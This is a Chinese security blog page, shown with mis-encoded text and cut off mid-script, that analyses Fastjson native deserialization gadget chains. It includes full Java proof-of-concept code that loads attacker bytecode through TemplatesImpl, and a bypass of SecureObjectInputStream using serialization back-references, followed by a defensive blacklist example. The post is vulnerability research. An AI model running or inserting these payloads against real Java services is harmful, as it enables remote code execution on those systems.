<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>FastjsonåŸç”Ÿé“¾ | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶ è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="FastjsonåŸç”Ÿé“¾" />
<meta property="og:description" content="åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶ è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-03-03T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-07-02T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FastjsonåŸç”Ÿé“¾"/>
<meta name="twitter:description" content="åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶ è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "FastjsonåŸç”Ÿé“¾",
      "item": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "FastjsonåŸç”Ÿé“¾",
  "name": "FastjsonåŸç”Ÿé“¾",
  "description": "åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶ è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™",
  "keywords": [
    
  ],
  "articleBody": " åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶\nè¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™ä¸ªAntiCollisionHashMapäº†\nç¯å¢ƒ\norg.javassist javassist 3.19.0-GA com.alibaba fastjson 1.2.48 1.2.48\u003c= 0x01 åˆ†æ å·²çŸ¥æ¡ä»¶æœ‰JSON.toString-\u003eJSON.toJSONStringè§¦å‘getteræ–¹æ³•\nè¿™é‡Œæˆ‘ä»¬å°±æ˜¯è¦åˆ†ææ€ä¹ˆè§¦å‘çš„getteræ–¹æ³•\nè·Ÿè¿›è¿™é‡Œwrite()\nåœ¨ä¸‹é¢è¿™ä¸ªwrite()ä¸­ï¼Œä¼šè§¦å‘æˆ‘ä»¬çš„getterï¼Œä½†æ˜¯itemSerializeræ˜¯ä¸€ä¸ªæ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„ç±»ï¼ŒåŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªObjectSerializerå¯¹è±¡\nåˆ™æˆ‘ä»¬è·Ÿè¿›serializer.getObjectWriterçœ‹çœ‹æ€ä¹ˆåˆ›é€ çš„\nåœ¨ASMSerializerFactory#createJavaBeanSerializerä¸­ä¼šå¯¹è¿™ä¸ªClassè¿›è¡Œåˆ›é€ ï¼Œå¹¶å®ä¾‹åŒ–ç”Ÿæˆå¯¹è±¡è¿”å›\nè¿™é‡Œæˆ‘ä»¬ç›´æ¥è·å–æœ€ç»ˆçš„byte[]è¿˜åŸè¿™ä¸ªclass\nimport java.io.FileOutputStream; import java.io.IOException; import java.util.Base64; public class SaveClassFile { public static void saveClassFile(String className, byte[] code) { // å®šä¹‰æ–‡ä»¶è·¯å¾„å’Œåç§° String fileName = className + \".class\"; try (FileOutputStream fos = new FileOutputStream(fileName)) { // å°†å­—èŠ‚æ•°ç»„å†™å…¥æ–‡ä»¶ fos.write(code); System.out.println(\"Class file saved: \" + fileName); } catch (IOException e) { e.printStackTrace(); } } public static void main(String[] args) { // ç¤ºä¾‹ï¼šå‡è®¾ä½ å·²ç»æœ‰ä¸€ä¸ª byte[] code String base64=\"yv66vgAAADEA5gEAPWNvb...\"; byte[] code = Base64.getDecoder().decode(base64); String className = \"ser\"; saveClassFile(className, code); } } è¿˜åŸå‡ºæ¥å¼ ä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå…¶writeæ–¹æ³•ä¸­ï¼Œç»è¿‡ä¸å®Œæ•´è°ƒè¯•ä¼šè¿›å…¥elseè°ƒç”¨ä¸‹é¢çš„getOutputProperties()\nç„¶åå…³äºFieldInfoçš„å€¼çš„è·å–ï¼Œè¿™ä¸ªå…³ç³»åˆ°ä¼šè°ƒç”¨å“ªäº›getterï¼Œè¿™é‡Œç®€å•æä¸€å˜´å§\ncomputeGetters()æ–¹æ³•é‡Œï¼Œä¼šå¯¹è¯¥ç±»çš„æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œå¹¶æå–getå’Œiså¼€å¤´çš„æ–¹æ³•\nif(methodName.startsWith(\"get\")){ if(methodName.startsWith(\"is\")){ ç„¶åè¿™äº›æå–çš„FieldInfoåˆ™å­˜å‚¨åœ¨fieldsä¸­äº†\nç„¶åæ•´æ¡é“¾å­å°±æ²¡ä»€ä¹ˆéš¾åº¦äº†ï¼Œé€šè¿‡BadAttributeValueExpExceptionè§¦å‘toStringå°±è¡Œ\n0x02 poc getterè°ƒç”¨æ˜¯é€šè¿‡è§¦å‘JSON#toStringå®ç°çš„ï¼ŒJSONè¿™é‡Œæ˜¯æŠ½è±¡ç±»ï¼Œç„¶åä»–æœ‰ä¸¤ä¸ªç»§æ‰¿ç±»JSONArrayï¼ŒJSONArray\nMap\u003cString, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"sd\", templates); JSONObject objects = new JSONObject(map); import com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.Base64; public class Learn { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); JSONArray objects = new JSONArray(); objects.add(templates); Class\u003c?\u003e aClass = Class.forName(\"javax.management.BadAttributeValueExpException\"); Constructor\u003c?\u003e o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\"val\"); val.setAccessible(true); val.set(o1, objects); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o1); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void setFiled(TemplatesImpl templates, String name, Object number) throws NoSuchFieldException, IllegalAccessException { Field declaredField = TemplatesImpl.class.getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,number); } } 1.2.49â€“\u003e2.0.26 1.2.49ä¹‹åï¼ŒJSONObjectæ–°å¢äº†SecureObjectInputStreamæ¥å¤„ç†JSONObjectå’ŒJSONArrayçš„readObject()ååºåˆ—åŒ–ï¼Œå…¶ä¸­å¢åŠ äº†resolveClasså’ŒresolveProxyClassä¼šå¯¹ç›¸å…³çš„æ™®é€šç±»ä»¥åŠä»£ç†ç±»çš„æ¥å£ç±»è¿›è¡Œæ£€æµ‹\nè¿™é‡Œé»‘åå•æ£€æµ‹å‡ºcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\nè¿™é‡Œåˆ©ç”¨æ€è·¯ï¼Œæ˜¯å› ä¸ºSecureObjectInputStreamåªä¼šå¤„ç†JSON2ç›¸å…³çš„ååºåˆ—åŒ–(è¿™é‡ŒJSON2ä»£è¡¨JSONObjectå’ŒJSONArrayï¼Œåé¢éƒ½è¿™æ ·è¡¨ç¤ºæ‡’å¾—å†™äº†)ï¼Œè¿™è®©æˆ‘ä»¬æœ‰äº†æ“ä½œçš„ç©ºé—´\nä»€ä¹ˆæ„æ€å‘¢ï¼Œè¿™é‡Œå†™äº†ä¸€ä¸ªå°demoä¾›å¤§å®¶ç†è§£ï¼Œè¿™é‡ŒTemplatesImplå’ŒJdbcRowSetImpléƒ½æ˜¯é»‘åå•çš„ï¼Œè€Œè¿™é‡Œåªæœ‰addåˆ°JSONArrayçš„JdbcRowSetImplä¼šè¢«SecureObjectInputStreamå¤„ç†ï¼Œè€ŒTemplatesImplåˆ™æ˜¯æ­£å¸¸çš„ObjectInputStreamçš„å¤„ç†ï¼Œåˆ™ä¸ä¼šè¢«æ£€æµ‹ã€‚\nimport com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.rowset.JdbcRowSetImpl; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.net.URL; import java.util.ArrayList; import java.util.Properties; public class test_ser { public static void main(String[] args) throws Exception { TemplatesImpl templates=new TemplatesImpl(); JdbcRowSetImpl url= new JdbcRowSetImpl(); JSONArray objects = new JSONArray(); objects.add(url); ArrayList\u003cObject\u003e arrayList = new ArrayList\u003c\u003e(); arrayList.add(templates); arrayList.add(objects); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(arrayList); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } å…¶å®å½“æ—¶çœ‹æ„Ÿè§‰å¼€å‘å¤„ç†çš„å¾ˆå¥½ï¼Œå› ä¸ºè¿™ç§ä¸ä¼šå½±å“åˆ°æ­£å¸¸çš„ååºåˆ—åŒ–ï¼Œå±€éƒ¨çš„è¿›è¡Œäº†æ£€æµ‹ã€‚\nç„¶åè¿˜æœ‰ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨TemplatesImplè‚¯å®šæ˜¯è¦æ”¾åˆ°ArrayListä¸­çš„ï¼Œé‚£ä¸Šé¢æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œå¾…æˆ‘æ…¢æ…¢é“æ¥\nè¿™æ˜¯å› ä¸ºï¼Œjavaååºåˆ—åŒ–ä¸­ä¸ºäº†æé«˜æ•ˆç‡ï¼Œååºåˆ—åŒ–è¿‡ä¸€æ¬¡çš„å¯¹è±¡ä¼šæ”¾åˆ°ä¸€ä¸ªç±»ä¼¼Mapçš„å‚æ•°ä¸­ï¼Œä¸‹ä¸€æ¬¡ååºåˆ—åŒ–åˆ°è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œåˆ™ä¼šç›´æ¥ä»è¿™ä¸ªMapä¸­è·å–å¯¹åº”çš„å¯¹è±¡ï¼Œè€Œä¸ä¼šå†èµ°ç¬¬ä¸€æ¬¡å¤„ç†ååºåˆ—åŒ–çš„æµç¨‹ï¼Œè€ŒresolveClassçš„å¤„ç†æ˜¯åœ¨ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–ä¸­è¿›è¡Œæ£€æµ‹çš„ï¼Œå¹¶ä¸ä¼šåœ¨ç¬¬äºŒæ¬¡ä¸­è¿›è¡Œæ£€æµ‹\næ‰€ä»¥æˆ‘ä»¬å…ˆé€šè¿‡ObjectInputStreamå¸®æˆ‘ä»¬å®ç°ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–ï¼Œç¬¬ä¸€æ¬¡ååºåˆ—åŒ–æ£€æµ‹çš„æ˜¯ObjectInputStream#resolveClasså¹¶ä¸ä¼šå¯¹æˆ‘ä»¬çš„ç±»ç…§æˆå½±å“ï¼Œè€ŒSecureObjectInputStreamå¤„ç†çš„æ˜¯ç¬¬äºŒæ¬¡ååºåˆ—åŒ–åˆ™å®ç°äº†ç»•è¿‡SecureObjectInputStream#resolveClass\nè¿™é—®é¢˜å…¶å®ä¹Ÿè·Ÿjavaååºåˆ—åŒ–çš„è°ƒç”¨å¤„ç†æœ‰å¾ˆå¤§å…³ç³»hhhï¼Œå¦‚æœæ²¡è¿™ä¸ªæœºåˆ¶çš„è¯ï¼Œå…¶å®å¼€å‘è¿™æ ·å†™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹çœ‹javaååºåˆ—åŒ–ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„\njavaååºåˆ—åŒ– readObject0è¿™é‡Œä¼šæœ‰ä¸€ä¸ªswitchå¤„ç†ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†\nå…ˆçœ‹çœ‹æ­£å¸¸æµç¨‹å§ï¼Œæ­£å¸¸ç±»æ˜¯è¿›å…¥\ncase TC_OBJECT:--\u003ereadOrdinaryObject()--\u003ereadClassDesc(false)--\u003ecase TC_CLASSDESC: --\u003ereadNonProxyDesc()--\u003eresolveClass() //è§¦å‘æ£€æµ‹ ç„¶åæˆ‘ä»¬æ˜¯è¦é¿å…æ£€æµ‹çš„ï¼Œå¦‚æœä»readClassDesc()å‡ºå‘çš„è¯ï¼Œå…¶å®åªå‰©TC_REFERENCEå¯ä»¥çœ‹çœ‹äº†\nTC_NULLæ˜¯è¿”å›nullçš„\nTC_PROXYCLASSDESCæ˜¯å¤„ç†ä»£ç†ç±»çš„ï¼Œè€Œä»£ç†ç±»ï¼ŒSecureObjectInputStreamä¹Ÿæ˜¯åšäº†æ£€æµ‹çš„\nè€ŒTC_REFERENCEæ­£æ˜¯å¤„ç†å·²ç»ååºåˆ—åŒ–è¿‡çš„ç±»ï¼Œè¿™é‡Œçš„TC_REFERENCEå…¶å®å’ŒreadObject0ä¸­TC_REFERENCEå¤„ç†æ˜¯ä¸€æ ·çš„ã€‚å¾€ä¸Šæ¨ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦é¿å…readClassDesc()æ–¹æ³•ï¼Œé‚£ä¹ˆå…¶å®readObject0å°±åªå‰©TC_REFERENCEçš„è°ƒç”¨äº†ï¼ŒæŸ¥çœ‹å¯¹åº”readHandle()æ–¹æ³•\nè¿™é‡Œhandles.lookupObjectè·å–handles.entriesä¸­å¯¹åº”çš„å¯¹è±¡,å¹¶returnã€‚é‚£æˆ‘ä»¬å†çœ‹çœ‹è¿™äº›å€¼æ˜¯æ€ä¹ˆæ·»åŠ è¿›å»çš„\nhandles.entriesçš„å€¼ä¸€èˆ¬é€šè¿‡ä¸‹å›¾ä¸­ï¼Œhandles.assignæ·»åŠ \nä¸Šå›¾å°±æ˜¯æ­£å¸¸å¤„ç†å®Œååºåˆ—åŒ–åï¼Œå°†ååºåˆ—åŒ–åçš„å¯¹è±¡å­˜å‚¨åˆ°handlesä¸­ï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡å¤„ç†åŒä¸€ä¸ªç±»æ—¶ç›´æ¥è°ƒç”¨\nint assign(Object obj) { if (size \u003e= entries.length) { grow(); } status[size] = STATUS_UNKNOWN; entries[size] = obj; return size++; } ç„¶åå°±æ˜¯pocç¯èŠ‚å•¦\npoc ArrayList\u003cObject\u003e arrayList = new ArrayList\u003c\u003e(); arrayList.add(templates); arrayList.add(o1); è¿™é‡Œä¸»è¦å°±æ˜¯å…ˆè®©ObjectInputStreamå°†TemplatesImplååºåˆ—åŒ–ä¸€æ¬¡ï¼Œå†äº¤ç»™SecureObjectInputStreamå¤„ç†ï¼Œç„¶åcaseé‚£äº›byteï¼Œjavaåºåˆ—åŒ–ä¼šå¸®æˆ‘ä»¬å®Œæˆã€‚å½“ç„¶è¿™é‡Œä¸æ­¢listï¼Œåªè¦æ˜¯å¯ä»¥å­˜å‚¨å¤šä¸ªå¯¹è±¡çš„éƒ½å¯ä»¥ï¼Œç„¶åè®©TemplatesImplå…ˆååºåˆ—åŒ–å³å¯\nimport com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.Base64; public class Learn2 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); JSONArray objects = new JSONArray(); objects.add(templates); Class\u003c?\u003e aClass = Class.forName(\"javax.management.BadAttributeValueExpException\"); Constructor\u003c?\u003e o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\"val\"); val.setAccessible(true); val.set(o1, objects); ArrayList\u003cObject\u003e arrayList = new ArrayList\u003c\u003e(); arrayList.add(templates); arrayList.add(o1); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(arrayList); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void setFiled(TemplatesImpl templates, String name, Object number) throws NoSuchFieldException, IllegalAccessException { Field declaredField = TemplatesImpl.class.getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,number); } } å®‰å…¨æ£€æµ‹ é‚£æ€ä¹ˆæ ·æ˜¯å®‰å…¨çš„å‘¢ï¼Œå…¶å®ä¸Šé¢çš„åŸå› å°±æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„ç´¯éƒ½è¿›è¡Œäº†resolveClassæ£€æµ‹\né‚£æ€ä¹ˆæ‰å®‰å…¨ï¼Œä¸‹æ–¹åŠé€šè¿‡SafeObjectInputStreamåŒ…è£…ï¼Œå†readObjectå°±å…¨éƒ¨éƒ½è¿›è¡ŒresolveClassæ£€æµ‹äº†\nè€Œåœ¨fastjsonä¸­åŠé€šè¿‡SecureObjectInputStreamåŒ…è£…ï¼Œä½†æ˜¯è²Œä¼¼å¼€å‘ä¸æ˜¯è¿™æ ·æƒ³ï¼Œå› ä¸ºæˆ‘åå°„å»è°ƒç”¨è¿™ä¸ªæ¥åŒ…è£…ååºåˆ—åŒ–æ—¶ä¼šç©ºæŒ‡é’ˆæŠ¥é”™ï¼Œé‚£å¼€å‘æ€è·¯åº”è¯¥æ˜¯åº”ç”¨æ›´æ–¹ä¾¿æ¥çš„ï¼Œä¸å¦‚çš„è¯æ¯ä¸ªååºåˆ—åŒ–éƒ½éœ€è¦SecureObjectInputStreamåŒ…è£…ï¼Œä¿®æ”¹ä»¥å‰ä»£ç å·¥ç¨‹é‡åº”è¯¥ä¸å°hhh\npublic class SafeObjectInputStream extends ObjectInputStream { public SafeObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); if (className.equals(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\")) { throw new SecurityException(\"Deserialization of TemplatesImpl is not allowed!\"); } return super.resolveClass(desc); } } FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new SafeObjectInputStream(fis); ois.readObject(); ois.close(); å‚è€ƒ\nhttps://www.cnpanda.net/sec/893.html\nhttps://www.cnpanda.net/sec/928.html\nhttps://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\n",
  "wordCount" : "3210",
  "inLanguage": "zh",
  "datePublished": "2025-03-03T20:01:23+08:00",
  "dateModified": "2025-07-02T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      FastjsonåŸç”Ÿé“¾
    </h1>
    <div class="post-meta"><span title='2025-03-03 20:01:23 +0800 CST'>2025-03-03</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#1248" aria-label="1.2.48&amp;lt;=">1.2.48&lt;=</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%88%86%e6%9e%90" aria-label="0x01 åˆ†æ">0x01 åˆ†æ</a></li>
                    <li>
                        <a href="#0x02-poc" aria-label="0x02 poc">0x02 poc</a></li></ul>
                    </li>
                    <li>
                        <a href="#1249--2026" aria-label="1.2.49&amp;ndash;&amp;gt;2.0.26">1.2.49&ndash;&gt;2.0.26</a><ul>
                            
                    <li>
                        <a href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="javaååºåˆ—åŒ–">javaååºåˆ—åŒ–</a></li>
                    <li>
                        <a href="#poc" aria-label="poc">poc</a></li>
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e6%a3%80%e6%b5%8b" aria-label="å®‰å…¨æ£€æµ‹">å®‰å…¨æ£€æµ‹</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
